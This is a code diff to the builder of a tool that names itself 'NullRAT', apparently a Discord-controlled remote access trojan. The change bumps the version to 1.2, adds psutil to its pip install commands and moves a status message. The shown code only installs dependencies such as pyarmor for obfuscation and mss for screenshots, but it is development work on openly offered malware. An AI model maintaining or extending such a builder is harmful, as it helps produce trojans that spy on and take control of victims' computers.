@@ -376,7 +376,7 @@ proc variablesCreator(x: int) =
         if compiler() == 0:
             return
 
-const pipModules = ["pyinstaller", "virtualenv", "disnake", "requests", "pyarmor", "mss"]
+const pipModules = ["pyinstaller", "virtualenv", "disnake", "requests", "pyarmor", "mss", "psutil"]
          
 proc packageInstaller() = 
     printName()
@@ -401,7 +401,6 @@ proc packageInstaller() =
         else:
             for module in pipModules:
                 if module notin result.output:
-                    echo "Some dependencies are not installed!"
                     allInstalled = false
             
             if allInstalled:
@@ -409,15 +408,16 @@ proc packageInstaller() =
                 sleep(1000)
                 variablesCreator(0)
             else:
+                echo "Some dependencies are not installed!\n"
                 stdout.styledWriteLine({styleBright}, "[3] Installing/Updating dependencies...")
-                var res = execShellCmd("pip install pyinstaller virtualenv aiohttp disnake requests mss pyarmor")
+                var res = execShellCmd("pip install pyinstaller virtualenv aiohttp disnake requests mss pyarmor psutil")
                 if res == 0:
                     echo "========================"
                     stdout.styledWriteLine(fgGreen, {styleBright}, "All Installed!\nMoving to variables creation...")
                     sleep(2000)
                     variablesCreator(0)
                 else:
-                    var res = execShellCmd("py -m pip install pyinstaller virtualenv aiohttp disnake requests mss pyarmor")
+                    var res = execShellCmd("py -m pip install pyinstaller virtualenv aiohttp disnake requests mss pyarmor psutil")
                     if res == 0:
                         echo "========================"
                         stdout.styledWriteLine(fgGreen, {styleBright}, "All Installed!\nMoving to variables creation...")
@@ -451,7 +451,7 @@ proc packageInstaller() =
     
 proc mainMenu() =
     printName();
-    stdout.styledWriteLine({styleBright}, "  >> NullRAT Builder v1.1 <<")
+    stdout.styledWriteLine({styleBright}, "  >> NullRAT Builder v1.2 <<")
     echo ""
     stdout.styledWriteLine(fgGreen, {styleBright}, " - HINT! Press Q in any window to immediately return here!")
     stdout.styledWriteLine({styleBright}, "\n Press any key to continue,\n E/Q to exit,\n R to clear working directory,\n C to directly move to compiler (do this at your own risk)...")
